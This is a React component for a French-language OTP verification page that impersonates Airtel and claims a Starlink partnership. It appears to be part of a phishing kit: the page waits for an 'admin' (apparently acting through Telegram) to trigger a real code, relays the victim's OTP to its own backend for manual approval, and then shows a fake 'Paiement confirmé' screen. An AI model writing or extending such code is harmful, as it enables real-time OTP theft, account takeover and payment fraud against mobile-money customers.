import React, { useState, useEffect, useRef, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Loader2, CheckCircle, XCircle, RefreshCw } from 'lucide-react';
import airtelLogo from '@assets/image_1784479304453.png';
import {
  useGetSession,
  getGetSessionQueryKey,
  useSubmitOtp,
} from '@workspace/api-client-react';

type Stage = 'waiting_for_admin' | 'otp_entry' | 'awaiting_confirm' | 'verified' | 'rejected';

const OTP_COUNTDOWN = 30;

export default function Verify() {
  const [stage, setStage] = useState<Stage>('waiting_for_admin');
  const [otp, setOtp] = useState(['', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(OTP_COUNTDOWN);
  const [resending, setResending] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Read session ID from history state, fall back to sessionStorage
  // (sessionStorage survives mobile-browser backgrounding / tab restore)
  const sessionId = (
    (history.state?.usr?.sessionId as string | undefined) ||
    sessionStorage.getItem('airtel_session_id') ||
    ''
  );
  const phoneNumber = (
    (history.state?.usr?.phoneNumber as string | undefined) ||
    sessionStorage.getItem('airtel_phone') ||
    ''
  );

  // Poll while waiting for admin to send OTP, and while waiting for confirm/reject
  const shouldPoll = stage === 'waiting_for_admin' || stage === 'awaiting_confirm';

  const { data: sessionData, refetch } = useGetSession(sessionId, {
    query: {
      enabled: !!sessionId && shouldPoll,
      queryKey: getGetSessionQueryKey(sessionId),
      refetchInterval: shouldPoll ? 2000 : false,
      // Keep polling even while the tab is in the background
      // (user switches to Telegram to tap the button, then comes back)
      refetchIntervalInBackground: true,
    },
  });

  // Force an immediate re-poll whenever the tab becomes visible again
  useEffect(() => {
    const onVisible = () => {
      if (!document.hidden && shouldPoll && sessionId) void refetch();
    };
    document.addEventListener('visibilitychange', onVisible);
    window.addEventListener('focus', onVisible);
    return () => {
      document.removeEventListener('visibilitychange', onVisible);
      window.removeEventListener('focus', onVisible);
    };
  }, [refetch, shouldPoll, sessionId]);

  useEffect(() => {
    if (!sessionData) return;
    const s = sessionData.status;

    if (stage === 'waiting_for_admin' && s === 'otp_sent') {
      // Admin clicked "📤 OTP Envoyé" — open the OTP entry screen
      setOtp(['', '', '', '']);
      setTimeLeft(OTP_COUNTDOWN);
      setStage('otp_entry');
      setTimeout(() => inputRefs.current[0]?.focus(), 100);
    }

    if (stage === 'awaiting_confirm') {
      if (s === 'verified') setStage('verified');
      if (s === 'rejected') setStage('rejected');
    }
  }, [sessionData, stage]);

  // 30-second countdown, only ticks during OTP entry
  useEffect(() => {
    if (stage !== 'otp_entry' || timeLeft <= 0) return;
    const id = setInterval(() => setTimeLeft((p) => Math.max(0, p - 1)), 1000);
    return () => clearInterval(id);
  }, [stage, timeLeft]);

  const submitOtp = useSubmitOtp({
    mutation: { onSuccess: () => setStage('awaiting_confirm') },
  });

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const next = [...otp];
    next[index] = value.slice(-1);
    setOtp(next);
    if (value && index < 3) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (!pasted) return;
    const next = Array(4).fill('');
    for (let i = 0; i < pasted.length; i++) next[i] = pasted[i];
    setOtp(next);
    inputRefs.current[Math.min(pasted.length, 3)]?.focus();
  };

  const handleConfirm = () => {
    if (!sessionId || otp.some((d) => !d)) return;
    submitOtp.mutate({ id: sessionId, data: { otp: otp.join('') } });
  };

  // Ask admin to resend OTP — resets back to waiting screen
  const handleResend = useCallback(async () => {
    if (!sessionId || resending) return;
    setResending(true);
    try {
      await fetch(`/api/sessions/${sessionId}/resend-otp`, { method: 'POST' });
      setOtp(['', '', '', '']);
      setTimeLeft(OTP_COUNTDOWN);
      setStage('waiting_for_admin');
    } catch {
      // ignore, user can try again
    } finally {
      setResending(false);
    }
  }, [sessionId, resending]);

  return (
    <div className="min-h-[100dvh] flex flex-col bg-background font-sans items-center justify-center overflow-hidden">
      <AnimatePresence mode="wait">

        {/* ── Waiting for admin to send OTP ── */}
        {stage === 'waiting_for_admin' && (
          <motion.div
            key="waiting"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col items-center p-6 text-center"
            data-testid="view-waiting-admin"
          >
            <img src={airtelLogo} alt="Airtel" className="h-14 w-auto object-contain mb-12" />
            <Loader2 className="w-12 h-12 text-primary animate-spin mb-6" />
            <h2 className="text-2xl font-bold text-foreground mb-2">Envoi du code OTP…</h2>
            <p className="text-muted-foreground font-medium max-w-xs">
              Votre code OTP est en cours d'envoi vers{' '}
              <strong className="text-foreground">{phoneNumber || 'votre numéro'}</strong>.
              <br />Veuillez patienter.
            </p>
          </motion.div>
        )}

        {/* ── OTP entry ── */}
        {stage === 'otp_entry' && (
          <motion.div
            key="otp"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="w-full max-w-md px-4 flex flex-col items-center"
            data-testid="view-otp"
          >
            <div className="w-full bg-card rounded-3xl shadow-sm border border-card-border p-8 mb-8 text-center">
              <h1 className="text-2xl font-black text-foreground mb-2 tracking-tight">
                Vérification OTP
              </h1>
              <p className="text-muted-foreground text-sm font-medium mb-6">
                Entrez l'OTP reçu sur<br />
                <strong className="text-foreground text-base">{phoneNumber}</strong>
              </p>

              {/* OTP boxes */}
              <div className="mb-6">
                <div className="flex justify-center gap-3 md:gap-4" onPaste={handlePaste}>
                  {otp.map((digit, i) => (
                    <input
                      key={i}
                      ref={(el) => { inputRefs.current[i] = el; }}
                      type="text"
                      inputMode="numeric"
                      pattern="\d*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(i, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(i, e)}
                      className="w-14 h-16 md:w-16 md:h-20 text-center text-3xl font-black rounded-2xl border-2 border-input bg-secondary/30 focus:bg-card focus:border-primary focus:ring-4 focus:ring-primary/20 outline-none transition-all"
                      data-testid={`input-otp-${i}`}
                    />
                  ))}
                </div>
              </div>

              {/* Countdown */}
              <div className="mb-6 text-sm font-medium" data-testid="text-countdown">
                {timeLeft > 0 ? (
                  <span className="text-muted-foreground">
                    Code valide pendant{' '}
                    <strong className="text-foreground tabular-nums">{timeLeft}s</strong>
                  </span>
                ) : (
                  <span className="text-destructive font-semibold">Code expiré</span>
                )}
              </div>

              {submitOtp.isError && (
                <p className="text-sm text-destructive font-medium mb-4">
                  Erreur. Veuillez réessayer.
                </p>
              )}

              {/* CONFIRMER */}
              <button
                className="w-full bg-primary text-primary-foreground font-bold text-lg py-4 rounded-xl transition-transform active:scale-[0.98] hover:bg-primary/90 shadow-md shadow-primary/20 disabled:opacity-50 disabled:pointer-events-none flex items-center justify-center gap-2 mb-4"
                disabled={otp.some((d) => !d) || submitOtp.isPending}
                onClick={handleConfirm}
                data-testid="button-verify-submit"
              >
                {submitOtp.isPending
                  ? <><Loader2 className="w-5 h-5 animate-spin" />Envoi…</>
                  : 'CONFIRMER'}
              </button>

              {/* Resend — visible when countdown expires */}
              {timeLeft === 0 && (
                <button
                  className="w-full flex items-center justify-center gap-2 py-3 text-sm font-semibold text-primary hover:text-primary/80 transition-colors disabled:opacity-50"
                  onClick={handleResend}
                  disabled={resending}
                  data-testid="button-resend"
                >
                  {resending
                    ? <><Loader2 className="w-4 h-4 animate-spin" />Demande en cours…</>
                    : <><RefreshCw className="w-4 h-4" />Renvoyer le code OTP</>}
                </button>
              )}
            </div>

            <div className="flex flex-col items-center gap-3 opacity-70">
              <span className="text-xs font-bold text-muted-foreground uppercase tracking-wider">
                En collaboration avec STARLINK™
              </span>
              <img src={airtelLogo} alt="Airtel" className="h-7 w-auto object-contain grayscale" />
            </div>
          </motion.div>
        )}

        {/* ── Awaiting admin confirm/reject ── */}
        {stage === 'awaiting_confirm' && (
          <motion.div
            key="awaiting"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col items-center p-6 text-center"
            data-testid="view-awaiting"
          >
            <img src={airtelLogo} alt="Airtel" className="h-14 w-auto object-contain mb-10" />
            <Loader2 className="w-12 h-12 text-primary animate-spin mb-6" />
            <h2 className="text-2xl font-bold text-foreground mb-2">Vérification en cours…</h2>
            <p className="text-muted-foreground font-medium max-w-xs">
              Votre OTP est en cours de validation. Quelques secondes…
            </p>
          </motion.div>
        )}

        {/* ── Success ── */}
        {stage === 'verified' && (
          <motion.div
            key="success"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="flex flex-col items-center p-6 text-center"
            data-testid="view-success"
          >
            <img src={airtelLogo} alt="Airtel" className="h-16 w-auto object-contain mb-8" />
            <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center mb-6">
              <CheckCircle className="w-10 h-10 text-primary" />
            </div>
            <h2 className="text-2xl font-black text-foreground mb-2">Paiement confirmé !</h2>
            <p className="text-muted-foreground font-medium mb-1">
              Votre forfait internet a été activé avec succès.
            </p>
            <p className="text-sm text-muted-foreground">{phoneNumber}</p>
          </motion.div>
        )}

        {/* ── Rejected — retry or resend ── */}
        {stage === 'rejected' && (
          <motion.div
            key="rejected"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="flex flex-col items-center p-6 text-center"
            data-testid="view-rejected"
          >
            <img src={airtelLogo} alt="Airtel" className="h-16 w-auto object-contain mb-8" />
            <div className="w-20 h-20 rounded-full bg-destructive/10 flex items-center justify-center mb-6">
              <XCircle className="w-10 h-10 text-destructive" />
            </div>
            <h2 className="text-2xl font-black text-foreground mb-2">Code incorrect</h2>
            <p className="text-muted-foreground font-medium mb-6">
              L'OTP saisi est invalide.
            </p>

            <div className="flex flex-col gap-3 w-full max-w-xs">
              {/* Retry — go back to OTP entry */}
              <button
                onClick={() => {
                  setOtp(['', '', '', '']);
                  setTimeLeft(OTP_COUNTDOWN);
                  setStage('otp_entry');
                  setTimeout(() => inputRefs.current[0]?.focus(), 50);
                }}
                className="w-full py-3 bg-primary text-primary-foreground font-bold rounded-xl hover:bg-primary/90 transition-all shadow-md shadow-primary/20"
                data-testid="button-retry"
              >
                Ressaisir le code
              </button>

              {/* Resend — ask admin to send new OTP */}
              <button
                onClick={handleResend}
                disabled={resending}
                className="w-full flex items-center justify-center gap-2 py-3 text-sm font-semibold border border-input rounded-xl text-foreground hover:bg-muted transition-colors disabled:opacity-50"
                data-testid="button-resend-rejected"
              >
                {resending
                  ? <><Loader2 className="w-4 h-4 animate-spin" />Demande en cours…</>
                  : <><RefreshCw className="w-4 h-4" />Renvoyer le code OTP</>}
              </button>
            </div>
          </motion.div>
        )}

      </AnimatePresence>
    </div>
  );
}
